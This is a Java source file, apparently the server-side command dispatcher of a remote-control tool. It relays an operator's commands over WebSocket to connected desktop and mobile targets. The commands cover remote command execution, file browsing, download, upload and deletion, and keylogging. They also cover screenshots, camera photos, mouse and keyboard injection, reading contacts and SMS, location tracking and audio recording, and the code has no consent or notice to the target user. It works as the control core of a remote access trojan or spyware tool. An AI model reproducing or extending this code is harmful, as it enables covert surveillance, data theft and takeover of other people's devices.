package com.remotecontrol.star.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.remotecontrol.star.model.CommandModel;
import com.remotecontrol.star.model.Online;
import com.remotecontrol.star.socket.HandleListener;
import com.remotecontrol.star.socket.WebSocketServer;
import lombok.extern.slf4j.Slf4j;

import javax.websocket.Session;
import java.io.IOException;
import java.util.*;

@Slf4j
public class ControlJsonParse {

    /**
     * 全部目标
     */
    private static final String ALL = "*";

    /**
     * 存储监听鼠标的控制端列表
     */
//    public static Map<String, String> mouseListenerList = new HashMap<>();
    /**
     * 存储监听键盘的控制端列表
     * 被监听者为key，监听者为list，list为空则停止监听
     */
    public static Map<String, List<String>> keyboardListenerMap = new HashMap<>();
    /**
     * 存储传输map  receiver-target 每次检查到是字节数组就查找socket是哪个target返回，匹配后返回给receiver
     */
    public static Map<String, String> fileTransMap = new HashMap<>();

    public static void commandHandler(String commandJson, Session session){
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
        Integer type = commandModel.getC_type();
        Integer action = commandModel.getAction();
        if(type == null || action == null){
            log.warn("操作类型或动作不能为空");
        }else{
            switch (type){
                // desktop client
                // 查询动作，查询上线主机
                case 0:
                    log.info("[{}]查询了在线主机列表:[{}]", commandModel.getReceiver(), HandleListener.onlineList);
                    queryOnlineMap(session);
                    break;
                // 消息相关
                case 1:
                    messageHandler(commandJson);
                    break;
                // 资源管理
                case 2:
                    sourceHandler(commandJson);
                    break;
                // 硬件管理
                case 3:
                    deviceHandler(commandJson);
                    break;
                case 4:
                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                    break;
                // mobile client
                // 联系人操作
                case 11:
                    contactHandler(commandJson);
                    break;
                case 12:
                    log.info("[{}]查询了[{}]的短信记录", commandModel.getReceiver(), commandModel.getTarget());
                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                    break;
                case 13:
                    log.info("[{}]查询了[{}]的地理位置", commandModel.getReceiver(), commandModel.getTarget());
                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                    break;
                case 14:
                    log.info("[{}]让[{}]发起了拍照", commandModel.getReceiver(), commandModel.getTarget());
                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                    break;
                // 录音
                case 15:
                    recordHandler(commandJson);
                    break;
                default:
                    log.warn("未知操作类型" + commandModel.getC_type());
                    break;
            }
        }
    }

    private static void recordHandler(String commandJson) {
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
    }

    private static void contactHandler(String commandJson) {
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
        switch (commandModel.getC_type()){
            case 1:
                log.info("[{}]查询了[{}]的全部联系人", commandModel.getReceiver(), commandModel.getTarget());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 2:
                log.info("[{}]增加了[{}]的联系人: [{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 3:
                log.info("[{}]修改了[{}]的联系人: [{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 4:
                log.info("[{}]删除了[{}]的联系人: [{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            default:
                log.info("未知操作");
                break;
        }
    }

    private static void deviceHandler(String commandJson){
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
        switch (commandModel.getAction()){
            case 1:
                log.info("[{}]开始监听[{}]的键盘记录", commandModel.getReceiver(), commandModel.getTarget());
                // 如果开始有监听这个设备的人就发送一次监听请求，后面全部通过服务器转发
                // TODO: 如果控制者未手动关闭，断线后需要清除
                List<String> list = keyboardListenerMap.get(commandModel.getTarget());
                if(list == null){
                    List<String> listeners = new ArrayList<String>();
                    listeners.add(commandModel.getReceiver());
                    keyboardListenerMap.put(commandModel.getTarget(), listeners);
                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                }else{
                    boolean deleteFlag = false;
                    Iterator<String> listener = list.iterator();
                    // 检查是否要移除监听者
                    while(listener.hasNext()){
                        if(listener.next().equals(commandModel.getReceiver())){
                            listener.remove();
                            deleteFlag = true;
//                            System.out.println("是删除");
                            break;
                        }
                    }
                    // 再次发送请求取消监听
                    if(list.size() == 0){
//                        System.out.println("退出监听");
                        keyboardListenerMap.remove(commandModel.getTarget());
                        HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                    }
                    if(deleteFlag == false){
//                        System.out.println("是新的");
                        list.add(commandModel.getReceiver());
                    }

                }
//                if(keyboardListenerList.isEmpty()){
//                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
//                    // 添加被监听的一组(被监听对象，监听对象)
//                    keyboardListenerList.put(commandModel.getReceiver(), commandModel.getTarget());
//                }else{
//                    // 判断是加入还是退出监听
//                    System.out.println("要加入监听的人：" + commandModel.getReceiver());
//                    String target = keyboardListenerList.get(commandModel.getReceiver());
//                    System.out.println("是否已存在"+target + "当前");
//                }
                break;
//            case 2:
//                log.info("[{}]开始监听[{}]的鼠标记录", commandModel.getReceiver(), commandModel.getTarget());
//                // 如果开始有监听这个设备的人就发送一次监听请求，后面全部通过服务器转发
//                if(mouseListenerList.isEmpty()){
//                    HandleListener.sendToClient(commandModel.getTarget(), commandJson);
//                }
//                // 添加被监听的一组(被监听对象，监听对象)
//                mouseListenerList.put(commandModel.getReceiver(), commandModel.getTarget());
//                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
//                break;
            case 3:
                log.info("[{}]调用[{}]的摄像头拍照", commandModel.getReceiver(), commandModel.getTarget());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 4:
                log.info("[{}]开始获得[{}]的屏幕截图", commandModel.getReceiver(), commandModel.getTarget());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                // 将要返回数据的一对绑定 TODO: 半双工通信
                ClientJsonParse.dataTransMap.put(commandModel.getTarget(), commandModel.getReceiver());
                break;
            case 5:
                log.info("[{}]开始移动[{}]的鼠标到目标地点[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 6:
                log.info("[{}]使用[{}]的鼠标进行了[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 7:
                log.info("[{}]开始调用[{}]的摄像头拍照", commandModel.getReceiver(), commandModel.getTarget());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                // 将要返回数据的一对绑定 TODO: 半双工通信
                ClientJsonParse.dataTransMap.put(commandModel.getTarget(), commandModel.getReceiver());
                break;
//            case 7:
//                log.info("[{}]使用[{}]的键盘进行了[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
//                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
//                break;
            case 8:
                log.info("[{}]使用[{}]到键盘写入了[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            default:
                log.warn("未知硬件操作!");
                break;
        }
    }

    private static void sourceHandler(String commandJson){
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
        switch (commandModel.getAction()){
            case 0:
                log.info("[{}]查询了[{}]的硬盘列表", commandModel.getReceiver(), commandModel.getTarget());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 1:
                log.info("[{}]查询了[{}]的目录:[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 2:
                log.info("[{}]查看了[{}]的文件:[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 3:
                log.info("[{}]下载了[{}]的文件:[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                // 将要返回数据的一对绑定 TODO: 半双工通信
                ClientJsonParse.dataTransMap.put(commandModel.getTarget(), commandModel.getReceiver());
                break;
            case 4:
                log.info("[{}]向[{}]上传了文件:[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                // TODO: 检查是否已经有在传输到匹配队列
                // 添加传输map
                fileTransMap.put(commandModel.getReceiver(), commandModel.getTarget());
                // 传输给被控端保持同步
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 5:
                log.info("[{}]删除了[{}]的文件/目录:[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            default:
                break;
        }
    }

    private static void messageHandler(String commandJson) {
        CommandModel commandModel = JSON.parseObject(commandJson, CommandModel.class);
        // 消息相关的动作
        switch (commandModel.getAction()){
            case 0:
                log.info("[{}]向在线主机[{}]发出了执行命令:\n[{}]", commandModel.getReceiver(), commandModel.getTarget(), commandModel.getData());
                HandleListener.sendToClient(commandModel.getTarget(), commandJson);
                break;
            case 1:
                // 群发
                if(ALL.equals(commandModel.getTarget())){
                    log.info("[{}]发送了内容[{}]给全体成员", commandModel.getReceiver(), commandModel.getData());
                    for (Session session : WebSocketServer.webSocketMap.values()) {
                        try{
                            session.getBasicRemote().sendText(commandJson);
                        }catch (IOException e){
                            log.warn("转发全部出错，错误信息 ==> {}", e.getMessage());
                        }
                    }
                }
                break;
            case 2:
                String target = commandModel.getData();
                // 关闭与指定主机的链接
                try {
                    HandleListener.online.get(target).close();
                } catch (IOException e) {
                    log.warn("关闭连接出错，错误信息 ==> {}", e.getMessage());
                }
                HandleListener.online.remove(target);
                HandleListener.closeConnect(target);
//                WebSocketServer.noticeBreak(target);
                break;
            default:
                break;
        }
    }

    /**
     * 查询上线主机ip-操作系统信息
     * @param session 返回给某个控制者
     */
    private static void queryOnlineMap(Session session) {
        String onlines = JSON.toJSONString(HandleListener.onlineList);
        CommandModel commandModel = new CommandModel("*", "*", 100, 0, onlines);
        String json = JSONObject.toJSONString(commandModel);
        try {
            session.getBasicRemote().sendText(json);
        } catch (IOException e) {
            log.warn("queryOnlineMap error ==> {}", e.getMessage());
        }
    }

}
